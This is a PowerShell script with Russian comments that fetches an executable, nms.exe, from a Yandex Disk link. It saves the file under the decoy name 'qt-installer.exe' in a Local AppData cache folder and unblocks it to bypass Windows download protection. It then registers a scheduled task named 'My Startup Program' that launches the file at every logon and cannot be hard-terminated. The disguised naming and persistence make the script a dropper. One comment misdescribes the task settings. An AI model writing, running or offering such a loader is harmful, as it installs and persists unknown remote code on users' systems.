<#
.SYNOPSIS
Этот скрипт скачивает исполняемый файл, сохраняет его в папку Local AppData,
разблокирует его и добавляет в планировщик задач для запуска при каждом входе пользователя в систему.

.DESCRIPTION
ВНИМАНИЕ: Запуск исполняемых файлов, скачанных из интернета, может быть опасен.
Убедитесь, что вы полностью доверяете источнику файла.
#>

# --- НАСТРОЙКИ ---
# Замените URL-адрес на прямую ссылку для скачивания вашего .exe файла
$url = "https://downloader.disk.yandex.ru/disk/b59cf6946d6f5bbb707de8734204e7a87daaebe01d7eeb1483b5d16c6429778c/691a69cb/1il_VEvFM8pzOK8et-rlWgpEqVBvh_lNcRj8TOl1iuS9x8QLRsGlc16KRBF2Z547KglDvgL6HV35wRtK_rKwEg%3D%3D?uid=0&filename=nms.exe&disposition=attachment&hash=LhdXPG37oQAXA8FFkWQHSW%2Bs6z%2BItZx5OrSoHl%2BFecsq7LgG0yjqge/ln6wCWEfQq/J6bpmRyOJonT3VoXnDag%3D%3D&limit=0&content_type=application%2Fx-dosexec&owner_uid=811461357&fsize=18944&hid=028f4a125fdc2439a8da2aa548642d8f&media_type=executable&tknv=v3"

# Имя, под которым будет сохранен файл
$fileName = "qt-installer.exe"

# Имя для задачи в Планировщике задач
$taskName = "My Startup Program"

# --- ОСНОВНАЯ ЧАСТЬ СКРИПТА ---

try {
    # 1. Определение путей
    # Путь к папке для сохранения ($env:LOCALAPPDATA эквивалентен C:\Users\имя_пользователя\AppData\Local)
    $destinationFolder = Join-Path -Path $env:LOCALAPPDATA -ChildPath "cache\qt-installer"
    
    # Полный путь к будущему файлу
    $destinationPath = Join-Path -Path $destinationFolder -ChildPath $fileName

    # 2. Создание папки, если она не существует
    if (-not (Test-Path -Path $destinationFolder)) {
        Write-Host "Создание папки: $destinationFolder"
        New-Item -Path $destinationFolder -ItemType Directory -Force | Out-Null
    }

    # 3. Скачивание файла
    Write-Host "Скачивание файла из $url..."
    Invoke-WebRequest -Uri $url -OutFile $destinationPath
    Write-Host "Файл успешно сохранен по пути: $destinationPath"

    # 4. Разблокировка файла
    # Это необходимо, чтобы Windows не блокировала запуск файла, скачанного из интернета
    Write-Host "Разблокировка файла..."
    Unblock-File -Path $destinationPath

    # 5. Добавление программы в Планировщик задач для автозапуска
    Write-Host "Добавление задачи в Планировщик задач..."
    
    # Действие, которое будет выполняться - запуск нашего файла
    $taskAction = New-ScheduledTaskAction -Execute $destinationPath

    # Триггер, который будет запускать задачу - при входе текущего пользователя в систему
    $taskTrigger = New-ScheduledTaskTrigger -AtLogon

    # Настройки задачи (например, не запускать, если нет подключения к сети)
    $taskSettings = New-ScheduledTaskSettingsSet -DontStopIfGoingOnBatteries -DisallowHardTerminate

    # Регистрация (создание) задачи в системе
    Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Force -Description "Автоматический запуск $fileName"
    
    Write-Host "Задача '$taskName' успешно создана. Программа будет запускаться при каждом входе в систему."
    Write-Host "Готово!"

}
catch {
    Write-Error "Произошла ошибка: $_"
}

# Чтобы скрипт не закрылся сразу после выполнения, если его запускать двойным кликом
Read-Host -Prompt "Нажмите Enter для выхода"